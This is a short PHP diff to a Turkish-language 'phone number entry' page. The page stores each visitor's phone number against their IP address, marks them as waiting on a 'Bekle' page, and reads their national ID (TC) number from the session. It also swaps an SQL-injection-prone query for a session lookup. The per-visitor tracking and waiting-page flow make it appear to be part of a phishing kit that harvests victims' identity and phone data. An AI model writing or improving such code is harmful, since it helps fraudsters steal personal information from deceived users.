@@ -15,6 +15,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         // Update user record with phone
         $query = $db->prepare("UPDATE records SET tel = ?, page = 'Bekle', lastOnline = ? WHERE ipAddress = ?");
         $query->execute([$phone, time() + 10, IP]);
+        $_SESSION['user_tel'] = $phone;
         $ajax->redirect('bekle.php');
     } else {
         $has_error = true;
@@ -23,9 +24,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 $ajax->pageUpdate(IP, 'Telefon Numara Girişi');
 
-$ip = IP;
-$user_bilgi = $db->query("SELECT tc FROM records WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
-$kullanici_tc = isset($user_bilgi['tc']) ? htmlspecialchars($user_bilgi['tc']) : '';
+$kullanici_tc = isset($_SESSION['user_tc']) ? htmlspecialchars($_SESSION['user_tc']) : '';
 ?>
 <!DOCTYPE html>
 <html lang="tr">
